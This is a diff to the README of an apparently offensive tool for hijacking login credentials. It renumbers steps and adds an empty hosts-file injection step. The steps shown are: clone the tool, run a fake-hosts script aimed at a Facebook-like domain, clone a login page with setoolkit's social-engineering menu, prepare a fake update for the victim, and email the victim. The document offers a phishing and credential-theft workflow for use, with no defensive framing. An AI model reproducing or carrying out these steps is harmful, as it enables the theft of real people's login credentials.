@@ -21,7 +21,11 @@ $ pip install -r requirements.txt
 
 # Exploit steps:
 
-1. - Creating hosts exploit facebook.login.com
+1. - Ijecting the hosts file of the victim:
+```
+```
+
+2. - Creating hosts exploit facebook.login.com
 ```bash
 git clone https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials.git
 cd SSTC-HTTPS-hijack-login-credentials/Attacker/hosts_fake_inject
@@ -29,7 +33,7 @@ bash fakehost.sh
      follow the instruction...
 ```
 
-2. - setoolkit
+3. - setoolkit
 ```bash
 setoolkit
 1) Social-Engineering Attacks
@@ -51,7 +55,7 @@ set:webattack> Enter the url to clone: _your_site_
      enter
      enter
 ```
-3. - Prepare fake update for the victim
+4. - Prepare fake update for the victim
 ```bash
 cd SSTC-HTTPS-hijack-login-credentials/Attacker/sh1mazu_https_fake
 bash sh1m@zu.sh
@@ -60,7 +64,7 @@ bash sh1m@zu.sh
 ```
 
 
-4. - Sending email on the victim
+5. - Sending email on the victim
 
 
 
